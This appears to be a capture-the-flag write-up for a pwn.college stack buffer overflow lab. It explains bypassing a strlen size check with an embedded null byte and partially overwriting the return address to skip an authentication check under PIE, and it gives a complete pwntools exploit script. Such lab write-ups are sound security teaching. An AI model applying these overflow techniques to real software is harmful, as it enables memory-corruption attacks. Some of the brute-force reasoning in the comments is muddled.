



## Challenge Name: 
**Category:** Level 8.1

### Description

In this level, we need to force the program to execute the win_authed() function
by directly overflowing into the stored return address back to main.

Standard memory corruption mitigations for this challenge:
- the canary is disabled
- PIE is ENABLED

One caveat in this challenge is that the win_authed() function must first auth:
it only lets you win if you provide it with the argument 0x1337.
Speifically, the win_authed() function looks something like:
    void win_authed(int token)
    {
      if (token != 0x1337) return;
      puts("You win! Here is your flag: ");
      sendfile(1, open("/flag", 0), 0, 256);
      puts("");
    }


### Approach

In this level, **PIE** (Position Independent Executable) is enabled, which means we don't know the exact address of our target. However, since pages are aligned to 0x1000, we can just overwrite the offset.

Analyzing the binary on Gidra I found where will the buffer be stored inside the stack, knowing its offset form the RBP helps to understand the size of the payload.

![img](</pwn-college/Program-Security/memory-errors/level8/images/img1.png>)


The challenge will allocate a correctly-sized temporary
buffer on the heap for the payload, and then copy the data over to the stack to try avoiding BOFs(Buffer OverFlow):

```
if( 0x39 < strlen(buff_heap))
```
inserting a null byte '\x00' inside the payload is enought to bypass this check.

![img](</pwn-college/Program-Security/memory-errors/level8/images/img2.png>)

About the **win_authed()** function is easy to bypass the check, it's enought to overwrite the return address past the token check to bypass it!
To do this, we will need to analyze the program, identify where the check is in the win_authed() function, find the address right after the check, and write that address over the saved return address.

![img](</pwn-college/Program-Security/memory-errors/level8/images/img3.png>)

As said before, since the PIE is active we will bruteforce the 2 least significant bytes of the found address: <1f 20>

So the payload information and data ectracted are:

payload_size =
 - Offset between buffstart and RBP
 - +8 bytes of RBP
 - +2 bytes of the least significant bytes that we are bruteforcing

PAYLOAD = 
  - \x00(null_byte)
  -  RANDOM DATA till Return Address start
  -  \x1f \x20


### Solution
[Code here](/pwn-college/Program-Security/memory-errors/level8/solution.py)

```
# Import necessary module from the pwntools library
from pwn import *

# Initialize a flag to track whether the desired condition is met
found = False

# Since we have to bruteforce 2 bytes -> 16 possible values
# we iterate 16/2 times  = 8
for x in range(8):
    
    # If the desired condition is already found, break out of the loop
    if found:
        break

    # Create an ELF object representing the binary file
    elf = ELF('/challenge/babymem_level8.1')

    # Start a new process of the binary
    io = elf.process()

    # Receive data from the process until a specified string is encountered
    io.recvuntil(': ')

    # Define sizes for different parts of the payload
    ret_size = 8
    RBP_size = 8
    least_significant_size = 2
    null_byte_size = 1

    # Define a null byte
    null_byte = b'\x00'

    # Initialize RBP (base pointer) value just for calculation purpose
    RBP = 0

    # Starting address of the buffer
    buff_start = RBP - 0x60

    # Calculate the size of the payload as
    #|Buff start| ---overflow data--| ---overflow rbp--| change only 2 bytes of RET addr|
    payload_size = abs(buff_start - RBP) + RBP_size + least_significant_size

    # Send the payload size to the process
    io.sendline(f'{payload_size}'.encode())

    # Receive data from the process until '!' is encountered
    io.recvuntil('!')             

    # Define the least significant bytes of the return address that we are bruteforcing
    least_significant_byte_ret = '20 1f'

    # Construct the payload
    PAYLOAD = null_byte + b'A' * (payload_size - least_significant_size - null_byte_size)
    PAYLOAD += bytes(bytearray.fromhex(least_significant_byte_ret))

    # Send the payload to the process
    io.sendline(PAYLOAD)

    # Receive all output from the process and decode it
    output = io.recvall().decode()

    # Check if the output contains the string "You win!"
    if "You win!" in output:
        # If so, set the flag to True and print the output
        found = True
        print(output)

```
  

---
<a href="/pwn-college/main.md" class="btn">Back to home</a>
